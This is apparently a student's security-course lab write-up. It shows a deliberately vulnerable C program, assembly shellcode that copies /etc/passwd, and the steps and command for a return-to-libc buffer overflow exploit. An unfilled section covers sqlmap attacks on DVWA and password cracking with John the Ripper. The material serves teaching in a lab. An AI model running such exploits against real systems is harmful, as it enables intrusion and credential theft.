# Lab #1,22110031, Bien Xuan Huy, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    char local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:

### 1. Preparation

I saved the vulnerable C program the file file task1.c and shellcode into task1.asm.
In order to attack, I will first convert the task1.asm into machine code using the following commands. 

```
nasm -g -f elf task1.asm
ld -m elf_i386 -o task1 task1.o
```

My idea is I will use system() to execute task1, which generated above. In order to to that, I need to overflow the buffer memory to higher address, which will redirect my program flow to execute task1 as expected.

Consider the stack frame of the main function of task1.c.

<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/df4e5886a438efa58ca5f62a86a4dca38be1529f/images/task1/mainstackframe.png"><br>

I will replace the return address with the address of system(), set argc to the address of exit(), and set argv to the address of task1. This way, when the program returns, it will run system() as the return address is popped off the stack.

### 2. Conduct the attack

Now I need to find three thing: address of system(), address of exit(), address of task1. Here's the steps:

#### 1. Compile task1.c and turn off OS's address space layout randomization

Compiling task1.c and turning off OS's address space layout randomization using these commands:

```
sudo sysctl -w kernel.randomize_va_space=0
gcc -g task1.c -o task1.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
```

#### 2. Run gdb and find necessary addresses

Running following commands:

```
gdb -q task1.out
start
p system
p exit
```

Here's the result:

<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/df4e5886a438efa58ca5f62a86a4dca38be1529f/images/task1/address.jpg"><br>

Address of system(): 0xf7e50db0

Address of exit(): 0xf7e449e0

To find address of task1, I quit the gdb and run this command:

```
objdump -d task1
```

Here's the result:

<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/3a30229f26831b4a06f5cef45e2ba8ade49aa0fb/images/task1/task1.jpg"><br>

Observing the result, the address of task1 is: 0x08048060

#### 3. Conduct the attack

Here's the attack command:

```
./task1.out $(python -c "print('a' * 20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x60\x80\x04\x08')")
```

The first 20 bytes will overflow the buffer memory and the ebp, followed by the addresses we expect.


**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:



